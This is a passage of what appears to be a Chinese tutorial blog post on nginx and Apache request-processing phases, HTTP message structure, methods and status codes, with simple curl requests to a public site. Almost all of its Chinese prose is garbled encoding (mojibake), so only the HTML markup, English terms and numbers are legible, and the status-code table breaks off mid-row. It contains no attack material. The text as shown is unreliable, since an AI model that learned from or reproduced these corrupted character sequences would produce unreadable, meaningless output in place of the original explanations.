æˆæ­»å¾ªç¯ï¼›ç”±ngx_http_core_moduleæ¨¡å—å®ç°</p><p><code>preaccess</code>è®¿é—®æƒé™æ£€æŸ¥å‡†å¤‡é˜¶æ®µï¼Œhttpæ¨¡å—è¿›å…¥å¤„ç†é˜¶æ®µï¼Œngx_limit_reqï¼ˆè®¿é—®æ§åˆ¶çš„é¢‘ç‡ï¼‰å’Œngx_limit_zoneï¼ˆè®¿é—®çš„å¹¶å‘ç‡æ§åˆ¶ï¼‰ä¹Ÿä¼šè¿è¡Œ</p><p><code>access</code>è®¿é—®æƒé™æ£€æŸ¥æ‰§è¡Œé˜¶æ®µï¼Œngx_accesså’Œnginx_auth_request,ngx_luaçš„access-by_luaæ‰§è¡Œåœ¨è¿™ä¸ªé˜¶æ®µï¼Œé…ç½®æŒ‡ä»¤å¤šæ˜¯æ‰§è¡Œè®¿é—®æ§åˆ¶æ€§è´¨çš„ä»»åŠ¡ï¼Œæ¯”å¦‚æ£€æŸ¥ç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œæ£€æŸ¥ç”¨æˆ·çš„IPåœ°å€åˆæ³•æ€§</p><p><code>post-access</code>è®¿é—®æƒé™æ£€æŸ¥æäº¤é˜¶æ®µï¼Œå¦‚æœè¯·æ±‚ä¸è¢«å…è®¸è®¿é—®NginxæœåŠ¡å™¨ï¼Œè¯¥é˜¶æ®µç”¨äºè¿”å›é”™è¯¯çš„å“åº”</p><p><code>try-files</code>é…ç½®é¡¹try-fileså¤„ç†é˜¶æ®µï¼Œå¦‚æœhttpè®¿é—®çš„é™æ€æ–‡ä»¶try-filesé…ç½®é¡¹å¯ä»¥ä½¿è¿™ä¸ªè¯·æ±‚é¡ºåºåœ°è®¿é—®å¤šä¸ªé™æ€æ–‡ä»¶ï¼Œç›´è‡³ç¬¦åˆæ¡ä»¶</p><p><code>content</code>å†…å®¹äº§ç”Ÿé˜¶æ®µï¼Œå¤§éƒ¨åˆ†HTTPæ¨¡å—ä¼šæ‰§è¡Œï¼Œæ‰€æœ‰è¯·æ±‚å¤„ç†é˜¶æ®µä¸­çš„é‡è¦é˜¶æ®µè¿™ä¸ªé˜¶æ®µçš„æŒ‡ä»¤é€šå¸¸ç”¨æ¥ç”ŸæˆHTTPå“åº”çš„å†…å®¹</p><p><code>log</code>æ—¥å¿—æ¨¡å—å¤„ç†é˜¶æ®µï¼Œè®°å½•æ—¥å¿—</p><h2 id="Apacheçš„è¯·æ±‚å¤„ç†é˜¶æ®µ"><a href="#Apacheçš„è¯·æ±‚å¤„ç†é˜¶æ®µ" class="headerlink" title="Apacheçš„è¯·æ±‚å¤„ç†é˜¶æ®µ"></a>Apacheçš„è¯·æ±‚å¤„ç†é˜¶æ®µ</h2><p>1ã€Post-Read-Requesté˜¶æ®µ: åœ¨æ­£å¸¸è¯·æ±‚å¤„ç†æµç¨‹ä¸­ï¼Œè¿™æ˜¯æ¨¡å—å¯ä»¥æ’å…¥é’©å­çš„ç¬¬ä¸€ä¸ªé˜¶æ®µã€‚å¯¹äºé‚£äº›æƒ³å¾ˆæ—©è¿›å…¥å¤„ç†è¯·æ±‚çš„æ¨¡å—æ¥è¯´ï¼Œè¿™ä¸ªé˜¶æ®µå¯ä»¥è¢«åˆ©ç”¨ã€‚</p><p>2ã€URI Translationé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šå°†è¯·æ±‚çš„URLæ˜ å°„åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚æ¨¡å—å¯ä»¥åœ¨è¿™é˜¶æ®µæ’å…¥é’©å­ï¼Œæ‰§è¡Œè‡ªå·±çš„æ˜ å°„é€»è¾‘ã€‚mod_aliaså°±æ˜¯åˆ©ç”¨è¿™ä¸ªé˜¶æ®µå·¥ä½œçš„ã€‚</p><p>3ã€Header Parsingé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ£€æŸ¥è¯·æ±‚çš„å¤´éƒ¨ã€‚ç”±äºæ¨¡å—å¯ä»¥åœ¨è¯·æ±‚å¤„ç†æµç¨‹çš„ä»»ä½•ä¸€ä¸ªç‚¹ä¸Šæ‰§è¡Œæ£€æŸ¥è¯·æ±‚å¤´éƒ¨çš„ä»»åŠ¡ï¼Œå› æ­¤è¿™ä¸ªé’©å­å¾ˆå°‘è¢«ä½¿ç”¨ã€‚mod_setenvifå°±æ˜¯åˆ©ç”¨è¿™ä¸ªé˜¶æ®µå·¥ä½œçš„ã€‚</p><p>4ã€Access Controlé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ ¹æ®é…ç½®æ–‡ä»¶æ£€æŸ¥æ˜¯å¦å…è®¸è®¿é—®è¯·æ±‚çš„èµ„æºã€‚Apacheçš„æ ‡å‡†é€»è¾‘å®ç°äº†å…è®¸å’Œæ‹’ç»æŒ‡ä»¤ã€‚mod_authz_hostå°±æ˜¯åˆ©ç”¨è¿™ä¸ªé˜¶æ®µå·¥ä½œçš„ã€‚</p><p>5ã€Authenticationé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæŒ‰ç…§é…ç½®æ–‡ä»¶è®¾å®šçš„ç­–ç•¥å¯¹ç”¨æˆ·è¿›è¡Œè®¤è¯ï¼Œå¹¶è®¾å®šç”¨æˆ·ååŒºåŸŸã€‚æ¨¡å—å¯ä»¥åœ¨è¿™é˜¶æ®µæ’å…¥é’©å­ï¼Œå®ç°ä¸€ä¸ªè®¤è¯æ–¹æ³•ã€‚</p><p>6ã€Authorizationé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ ¹æ®é…ç½®æ–‡ä»¶æ£€æŸ¥æ˜¯å¦å…è®¸è®¤è¯è¿‡çš„ç”¨æˆ·æ‰§è¡Œè¯·æ±‚çš„æ“ä½œã€‚æ¨¡å—å¯ä»¥åœ¨è¿™é˜¶æ®µæ’å…¥é’©å­ï¼Œå®ç°ä¸€ä¸ªç”¨æˆ·æƒé™ç®¡ç†çš„æ–¹æ³•ã€‚</p><p>7ã€MIME Type Checkingé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ ¹æ®è¯·æ±‚èµ„æºçš„MIMEç±»å‹çš„ç›¸å…³è§„åˆ™ï¼Œåˆ¤å®šå°†è¦ä½¿ç”¨çš„å†…å®¹å¤„ç†å‡½æ•°ã€‚æ ‡å‡†æ¨¡å—mod_negotiationå’Œmod_mimeå®ç°äº†è¿™ä¸ªé’©å­ã€‚</p><p>8ã€FixUpé˜¶æ®µ : è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„é˜¶æ®µï¼Œå…è®¸æ¨¡å—åœ¨å†…å®¹ç”Ÿæˆå™¨ä¹‹å‰ï¼Œè¿è¡Œä»»ä½•å¿…è¦çš„å¤„ç†æµç¨‹ã€‚å’ŒPost_Read_Requestç±»ä¼¼ï¼Œè¿™æ˜¯ä¸€ä¸ªèƒ½å¤Ÿæ•è·ä»»ä½•ä¿¡æ¯çš„é’©å­ï¼Œä¹Ÿæ˜¯æœ€å¸¸ä½¿ç”¨çš„é’©å­ã€‚</p><p>9ã€Responseé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šç”Ÿæˆè¿”å›å®¢æˆ·ç«¯çš„å†…å®¹ï¼Œè´Ÿè´£ç»™å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªæ°å½“çš„å›å¤ã€‚è¿™ä¸ªé˜¶æ®µæ˜¯æ•´ä¸ªå¤„ç†æµç¨‹çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p><p>10ã€Loggingé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šåœ¨å›å¤å·²ç»å‘é€ç»™å®¢æˆ·ç«¯ä¹‹åè®°å½•äº‹åŠ¡ã€‚æ¨¡å—å¯èƒ½ä¿®æ”¹æˆ–è€…æ›¿æ¢Apacheçš„æ ‡å‡†æ—¥å¿—è®°å½•ã€‚</p><p>11ã€CleanUpé˜¶æ®µ : Apacheåœ¨æœ¬é˜¶æ®µçš„ä¸»è¦å·¥ä½œï¼šæ¸…ç†æœ¬æ¬¡è¯·æ±‚äº‹åŠ¡å¤„ç†å®Œæˆä¹‹åé—ç•™çš„ç¯å¢ƒï¼Œæ¯”å¦‚æ–‡ä»¶ã€ç›®å½•çš„å¤„ç†æˆ–è€…Socketçš„å…³é—­ç­‰ç­‰ï¼Œè¿™æ˜¯Apacheä¸€æ¬¡è¯·æ±‚å¤„ç†çš„æœ€åä¸€ä¸ªé˜¶æ®µã€‚</p><h1 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h1><p>HTTP ï¼ˆHyperText Transfer Protocalï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰ æ˜¯åº”ç”¨å±‚åè®®ï¼Œä½¿ç”¨ TCP åè®®è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå¸¸ç”¨ç«¯å£å·ä¸º 80ï¼Œç”¨äºå®ç° Web å®¢æˆ·ç«¯ å’Œ Web æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ã€‚HTTP åè®®è§„å®šäº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´é€šä¿¡çš„æŠ¥æ–‡æ ¼å¼ä»¥åŠæ•°æ®äº¤æ¢çš„æµç¨‹ã€‚</p><p>HTTPæ˜¯ä¸€ç§æ— çŠ¶æ€åè®®ï¼Œä¸WEBæµè§ˆå™¨ä¹‹é—´ä¸ä¼šå»ºç«‹æ°¸ä¹…è¿æ¥ï¼›å½“æœåŠ¡å™¨è¿”å›å“åº”åï¼Œå°±ä¼šå…³é—­ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ï¼Œåªæœ‰åœ¨é‡æ–°å‘èµ·è¯·æ±‚çš„æ—¶å€™æ‰ä¼šé‡æ–°å»ºç«‹è¿æ¥ï¼ˆæœåŠ¡å™¨ä¸ä¸»åŠ¨è¿æ¥ï¼Œè¿æ¥ç”±å®¢æˆ·ç«¯å‘èµ·ï¼‰</p><p>è®¡ç®—æœºä¸»è¦é€šè¿‡æµè§ˆå™¨çš„URLè¿›è¡ŒHTTPè¯·æ±‚å‘é€ã€‚</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL(Uniform Resource Locator),å³ç»Ÿä¸€èµ„æºå®šä½ç¬¦,æ˜¯ä¸“ä¸ºæ ‡è¯†Internetç½‘ä¸Šèµ„æºä½ç½®è€Œè®¾ç½®çš„ä¸€ç§ç¼–å€æ–¹å¼ï¼Œæˆ‘ä»¬å¹³æ—¶æ‰€è¯´çš„ç½‘é¡µåœ°å€æŒ‡çš„å³æ˜¯URLã€‚äº’è”ç½‘ä¸Šçš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„URLï¼Œå®ƒåŒ…å«çš„ä¿¡æ¯æŒ‡å‡ºæ–‡ä»¶çš„ä½ç½®ä»¥åŠæµè§ˆå™¨åº”è¯¥æ€ä¹ˆå¤„ç†å®ƒã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åè®®:&#x2F;&#x2F;ç”¨æˆ·å:å¯†ç @å­åŸŸå.åŸŸå.é¡¶çº§åŸŸåï¼ˆæœåŠ¡å™¨IPï¼‰:ç«¯å£å·&#x2F;ç›®å½•&#x2F;æ–‡ä»¶å.æ–‡ä»¶åç¼€?å‚æ•°&#x3D;å€¼</span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸­å¯ä»¥ä½¿ç”¨<code>curl</code>å‘½ä»¤å‘é€HTTPè¯·æ±‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#è®¿é—®HTTPå“åº”æ•°æ®</span><br><span class="line">curl http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201221225142635.png" alt="image-20201221225142635"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å›æ˜¾HTTPå“åº”å¤´éƒ¨æ•°æ®</span><br><span class="line">curl http:&#x2F;&#x2F;www.baidu.com -I</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201221225334555.png" alt="image-20201221225334555"></p><p>ä»<code>curl</code>å‘½ä»¤çš„ç»“æœï¼Œå¯ä»¥è®¤ä¸ºæµè§ˆå™¨çš„ä½œç”¨æ˜¯æ¸²æŸ“HTTPå“åº”ä¿¡æ¯åŒ…</p><h2 id="HTTPåè®®çš„ç»“æ„"><a href="#HTTPåè®®çš„ç»“æ„" class="headerlink" title="HTTPåè®®çš„ç»“æ„"></a>HTTPåè®®çš„ç»“æ„</h2><p>HTTPæŠ¥æ–‡ç”±å®¢æˆ·æœºåˆ°æœåŠ¡å™¨çš„è¯·æ±‚å’Œä»æœåŠ¡å™¨åˆ°å®¢æˆ·æœºçš„ç›¸åº”æ„æˆã€‚</p><h3 id="â‘ -è¯·æ±‚æŠ¥æ–‡çš„ç»„æˆï¼š"><a href="#â‘ -è¯·æ±‚æŠ¥æ–‡çš„ç»„æˆï¼š" class="headerlink" title="â‘  è¯·æ±‚æŠ¥æ–‡çš„ç»„æˆï¼š"></a>â‘  è¯·æ±‚æŠ¥æ–‡çš„ç»„æˆï¼š</h3><p><strong>è¯·æ±‚è¡Œ + ä¿¡æ¯å¤´ + è¯·æ±‚å¤´ + å®ä½“å¤´ + æŠ¥æ–‡ä¸»ä½“</strong></p><p>è¯·æ±‚è¡Œçš„æ ¼å¼å¦‚ä¸‹ï¼š</p><p><strong>Method [åˆ†éš”ç¬¦] Request - URL [åˆ†éš”ç¬¦] HTTP-Version CRLF</strong></p><p>è§£é‡Šè¯´æ˜ï¼š</p><p>ï¼ˆ1ï¼‰Method è¡¨ç¤ºå®ŒæˆRequest - URLçš„æ–¹æ³•ï¼Œè¯¥å­—æ®µæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œæ®<a href="http://dl.dbank.com/c05bnl6946">RFC2616</a>æ ‡å‡†ï¼ˆç°è¡Œçš„HTTP/1.1ï¼‰å¾—çŸ¥ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹8ç§æ–¹æ³•ï¼š</p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">HEAD</td><td align="left">HEADæ–¹æ³•è·ŸGETæ–¹æ³•ç›¸åŒï¼Œåªä¸è¿‡æœåŠ¡å™¨å“åº”æ—¶ä¸ä¼šè¿”å›æ¶ˆæ¯ä½“</td></tr><tr><td align="left">PUT</td><td align="left">æŠŠæ¶ˆæ¯æœ¬ä½“ä¸­çš„æ¶ˆæ¯å‘é€åˆ°ä¸€ä¸ªURL,è·ŸPOSTç±»ä¼¼</td></tr><tr><td align="left">TRACE</td><td align="left">æ˜¯ç”¨æ¥è°ƒç”¨ä¸€ä¸ªè¿œç¨‹çš„è¯·æ±‚ä¿¡æ¯åº”ç”¨ç¨‹åºå±‚çš„å¾ªç¯åé€€</td></tr><tr><td align="left">CONNECT</td><td align="left">HTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚</td></tr><tr><td align="left">DELETE</td><td align="left">è¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URIæ‰€æ ‡è¯†çš„èµ„æº</td></tr><tr><td align="left">GET</td><td align="left">ç”±å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯è·å–Request-URIæ‰€æ ‡è¯†çš„èµ„æºçš„æ–¹æ³•</td></tr><tr><td align="left">POST</td><td align="left">ç”±å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯æäº¤Request-URIæ‰€æ ‡è¯†çš„èµ„æºåé™„åŠ æ–°çš„æ•°æ®</td></tr><tr><td align="left">OPTIONS</td><td align="left">è¯·æ±‚è·å¾—ç”±Request-URIæ ‡è¯†çš„èµ„æºåœ¨è¯·æ±‚/å“åº”çš„é€šä¿¡è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨çš„åŠŸèƒ½é€‰é¡¹</td></tr></tbody></table><p>ï¼ˆ2ï¼‰[åˆ†éš”ç¬¦]ä¸ºç©ºæ ¼</p><p>ï¼ˆ3ï¼‰Request - URLï¼š éµå¾ªURLæ ¼å¼ï¼Œæ­¤å­—æ®µä¸ºæ˜Ÿå·ï¼ˆ*ï¼‰æ—¶ï¼Œè¯´æ˜è¯·æ±‚å¹¶ä¸ç”¨äºæŸä¸ªç‰¹å®šçš„èµ„æºåœ°å€ï¼Œè€Œæ˜¯ç”¨äºæœåŠ¡æœ¬èº«ã€‚</p><p>ï¼ˆ4ï¼‰HTTP-Versionï¼šè¡¨ç¤ºæ”¯æŒçš„HTTPç‰ˆæœ¬ï¼Œå¦‚HTTP/1.1</p><p>ï¼ˆ5ï¼‰CRLFï¼šè¡¨ç¤ºæ¢è¡Œå›è½¦ç¬¦</p><p><strong>HTTPçš„å¤´</strong>åŒ…æ‹¬é€šç”¨çš„ä¿¡æ¯å¤´ã€è¯·æ±‚å¤´ã€å“åº”å¤´ã€å®ä½“å¤´4éƒ¨åˆ†ï¼Œæ¯ä¸ªå¤´åŸŸç”±ä¸€ä¸ªåŸŸåã€å†’å·å’Œå€¼åŸŸ3éƒ¨åˆ†ç»„æˆã€‚åŸŸåæ˜¯å¤§å°å†™æ— å…³çš„ï¼›åŸŸå€¼å‰å¯ä»¥æ·»åŠ ä»»ä½•æ•°é‡çš„ç©ºæ ¼ï¼Œæ¯ä¸ªHTTPè¯·æ±‚å¯ä»¥åŒ…å«å¤šä¸ªHTTPå¤´åŸŸã€‚</p><p><strong>HTTPæŠ¥æ–‡ä¸»ä½“</strong>åˆ™åŒ…å«äº†HTTPè¯·æ±‚çš„å†…å®¹ï¼Œå¯¹äºgetæ–¹æ³•ï¼ŒæŠ¥æ–‡ä¸»ä½“ä¸ºç©ºï¼Œå¯¹äºpostæ–¹æ³•ï¼ŒæŠ¥æ–‡ä¸»ä½“åˆ™åŒ…å«éœ€è¦å‘é€ç»™æœåŠ¡å™¨çš„æ•°æ®ã€‚</p><h3 id="â‘¡-å“åº”æŠ¥æ–‡çš„ç»„æˆï¼š"><a href="#â‘¡-å“åº”æŠ¥æ–‡çš„ç»„æˆï¼š" class="headerlink" title="â‘¡ å“åº”æŠ¥æ–‡çš„ç»„æˆï¼š"></a>â‘¡ å“åº”æŠ¥æ–‡çš„ç»„æˆï¼š</h3><p><strong>çŠ¶æ€è¡Œ + ä¿¡æ¯å¤´ + å“åº”å¤´ + å®ä½“å¤´ + æŠ¥æ–‡ä¸»ä½“</strong></p><p>è§£é‡Šè¯´æ˜ï¼š</p><p>ï¼ˆ1ï¼‰çŠ¶æ€è¡Œç”±çŠ¶æ€ç å’ŒåŸå› åˆ†æä¸¤éƒ¨åˆ†ç»„æˆï¼Œå…¶ä¸­ï¼ŒçŠ¶æ€ç ç”±3ä½æ•°å­—ç»„æˆï¼Œè¡¨ç¤ºè¯·æ±‚æ˜¯å¦è¢«ç†è§£æˆ–è¢«æ»¡è¶³ï¼Œç”¨æ¥æ”¯æŒè‡ªåŠ¨æ“ä½œï¼›åŸå› åˆ†ææ˜¯å¯¹åŸæ–‡çš„çŠ¶æ€ç ä½œç®€å•çš„æè¿°ï¼Œç”¨äºä¾›ç”¨æˆ·ä½¿ç”¨ã€‚</p><h3 id="â‘¢HTTPçŠ¶æ€ç "><a href="#â‘¢HTTPçŠ¶æ€ç " class="headerlink" title="â‘¢HTTPçŠ¶æ€ç "></a>â‘¢HTTPçŠ¶æ€ç </h3><table><thead><tr><th align="left">åˆ†ç±»</th><th align="left">åˆ†ç±»æè¿°</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œ</td></tr><tr><td align="left">2**</td><td align="left">æˆåŠŸï¼Œæ“ä½œè¢«æˆåŠŸæ¥æ”¶å¹¶å¤„ç†</td></tr><tr><td align="left">3**</td><td align="left">é‡å®šå‘ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œä»¥å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">4**</td><td align="left">å®¢æˆ·ç«¯é”™è¯¯ï¼Œè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">5**</td><td align="left">æœåŠ¡å™¨é”™è¯¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯</td></tr></tbody></table><p><strong>HTTPçŠ¶æ€ç åˆ—è¡¨</strong></p><table><thead><tr><th align="left">çŠ¶æ€ç </th><th align="left">çŠ¶æ€ç è‹±æ–‡åç§°</th><th align="left">ä¸­æ–‡æè¿°</th></tr></thead><tbody><tr><td align="left">100</td><td align="left">Continue</td><td align="left">ç»§ç»­ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­å…¶è¯·æ±‚</td></tr><tr><td align="left">101</td><td align="left">Switching Protocols</td><td align="left">åˆ‡æ¢åè®®ã€‚æœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚åˆ‡æ¢åè®®ã€‚åªèƒ½åˆ‡æ¢åˆ°æ›´é«˜çº§çš„åè®®ï¼Œä¾‹å¦‚ï¼Œåˆ‡æ¢åˆ°HTTPçš„æ–°ç‰ˆæœ¬åè®®</td></tr><tr><td align="left">200</td><td align="left">OK</td><td align="left">è¯·æ±‚æˆåŠŸã€‚ä¸€èˆ¬ç”¨äºGETä¸POSTè¯·æ±‚</td></tr><tr><td align="left">201</td><td align="left">Created</td><td align="left">å·²åˆ›å»ºã€‚æˆåŠŸè¯·æ±‚å¹¶åˆ›å»ºäº†æ–°çš„èµ„æº</td></tr><tr><td align="left">202</td><td align="left">Accepted</td><td align="left">å·²æ¥å—ã€‚å·²ç»æ¥å—è¯·æ±‚ï¼Œä½†æœªå¤„ç†å®Œæˆ</td></tr><tr><td align="left">203</td><td align="left">Non-Authoritative Information</td><td align="left">éæˆæƒä¿¡æ¯ã€‚è¯·æ±‚æˆåŠŸã€‚ä½†è¿”å›çš„metaä¿¡æ¯ä¸åœ¨åŸå§‹çš„æœåŠ¡å™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå‰¯æœ¬</td></tr><tr><td align="left">204</td><td align="left">No Content</td><td align="left">æ— å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†ï¼Œä½†æœªè¿”å›å†…å®¹ã€‚åœ¨æœªæ›´æ–°ç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯ç¡®ä¿æµè§ˆå™¨ç»§ç»­æ˜¾ç¤ºå½“å‰æ–‡æ¡£</td></tr><tr><td align="left">205</td><td align="left">Reset Content</td><td align="left">é‡ç½®å†…å®¹ã€‚æœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰åº”é‡ç½®æ–‡æ¡£è§†å›¾ã€‚å¯é€šè¿‡æ­¤è¿”å›ç æ¸…é™¤æµè§ˆå™¨çš„è¡¨å•åŸŸ</td></tr><tr><td align="left">206</td><td align="left">Partial Content</td><td align="left">éƒ¨åˆ†å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ†GETè¯·æ±‚</td></tr><tr><td align="left">300</td><td align="left">Multiple Choices</td><td align="left">å¤šç§é€‰æ‹©ã€‚è¯·æ±‚çš„èµ„æºå¯åŒ…æ‹¬å¤šä¸ªä½ç½®ï¼Œç›¸åº”å¯è¿”å›ä¸€ä¸ªèµ„æºç‰¹å¾ä¸åœ°å€çš„åˆ—è¡¨ç”¨äºç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰é€‰æ‹©</td></tr><tr><td align="left">301</td><td align="left">Moved Permanently</td><td align="left">æ°¸ä¹…ç§»åŠ¨ã€‚è¯·æ±‚çš„èµ„æºå·²è¢«æ°¸ä¹…çš„ç§»åŠ¨åˆ°æ–°URIï¼Œè¿”å›ä¿¡æ¯ä¼šåŒ…æ‹¬æ–°çš„URIï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®šå‘åˆ°æ–°URIã€‚ä»Šåä»»ä½•æ–°çš„è¯·æ±‚éƒ½åº”ä½¿ç”¨æ–°çš„URIä»£æ›¿</td></tr><tr><td align="left">302</td><td align="left">Found</td><td align="left">ä¸´æ—¶ç§»åŠ¨ã€‚ä¸301ç±»ä¼¼ã€‚ä½†èµ„æºåªæ˜¯ä¸´æ—¶è¢«ç§»åŠ¨ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­ä½¿ç”¨åŸæœ‰URI</td></tr><tr><td align="left">303</td><td align="left">See Other</td><td align="left">æŸ¥çœ‹å…¶å®ƒåœ°å€ã€‚ä¸301ç±»ä¼¼ã€‚ä½¿ç”¨GETå’ŒPOSTè¯·æ±‚æŸ¥çœ‹</td></tr><tr><td align="left">304</td><td align="left">Not Modified</td><td align="left">æœªä¿®æ”¹ã€‚æ‰€è¯·æ±‚çš„èµ„æºæœªä¿®æ”¹ï¼ŒæœåŠ¡å™¨è¿”å›æ­¤çŠ¶æ€ç æ—¶ï¼Œä¸ä¼šè¿”å›ä»»ä½•èµ„æºã€‚å®¢æˆ·ç«¯é€šå¸¸ä¼šç¼“å­˜è®¿é—®è¿‡çš„èµ„æºï¼Œé€šè¿‡æä¾›ä¸€ä¸ªå¤´ä¿¡æ¯æŒ‡å‡ºå®¢æˆ·ç«¯å¸Œæœ›åªè¿”å›åœ¨æŒ‡å®šæ—¥æœŸä¹‹åä¿®æ”¹çš„èµ„æº</td></tr><tr><td align="left">305</td><td align="left">Use Proxy</td><td align="left">ä½¿ç”¨ä»£ç†ã€‚æ‰€è¯·æ±‚çš„èµ„æºå¿…é¡»é€šè¿‡ä»£ç†è®¿é—®</td></tr><tr><td align="left">306</td><td align="left">Unused</td><td align="left">å·²ç»è¢«åºŸå¼ƒçš„HTTPçŠ¶æ€ç </td></tr><tr><td align="left">307</td><td align="left">Temporary Redirect</td><td align="left">ä¸´æ—¶é‡å®šå‘ã€‚ä¸302ç±»ä¼¼ã€‚ä½¿ç”¨GETè¯·æ±‚é‡å®šå‘</td></tr><tr><td align="left">400</td><td align="left">Bad Request</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚çš„è¯­æ³•é”™è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£</td></tr><tr><td align="left">401</td><td align="left">Unauthorized</td><td align="left">è¯·æ±‚è¦æ±‚ç”¨æˆ·çš„èº«ä»½è®¤è¯</td></tr><tr><td align="left">402</td><td align="left">Payment Required</td><td align="left">ä¿ç•™ï¼Œå°†æ¥ä½¿ç”¨</td></tr><tr><td align="left">403</td><td align="left">Forbidden</td><td align="left">æœåŠ¡å™¨ç†è§£è¯·æ±‚å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æ‰§è¡Œæ­¤è¯·æ±‚</td></tr><tr><td align="left">404</td><td align="left">Not Found</td><td align="left">æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚æ‰¾åˆ°èµ„æºï¼ˆç½‘é¡µï¼‰ã€‚é€šè¿‡æ­¤ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯è®¾ç½®â€æ‚¨æ‰€è¯·æ±‚çš„èµ„æºæ— æ³•æ‰¾åˆ°â€çš„ä¸ªæ€§é¡µé¢</td></tr><tr><td align="left">405</td><td align="left">Method Not Allowed</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„æ–¹æ³•è¢«ç¦æ­¢</td></tr><tr><td align="left">406</td><td align="left">Not Acceptable</td><td align="left">æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">407</td><td align="left">Proxy Authentication Required</td><td align="left">è¯·æ±‚è¦æ±‚ä»£ç†çš„èº«ä»½è®¤è¯ï¼Œä¸401ç±»ä¼¼ï¼Œä½†è¯·æ±‚è€…åº”å½“ä½¿ç”¨ä»£ç†è¿›è¡Œæˆæƒ</td></tr><tr><td align="left">408</td><td align="left">Request Time-out</td><td align="left">æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æ—¶é—´è¿‡é•¿ï¼Œè¶…æ—¶</td></tr><tr><td align="left">409</td><td 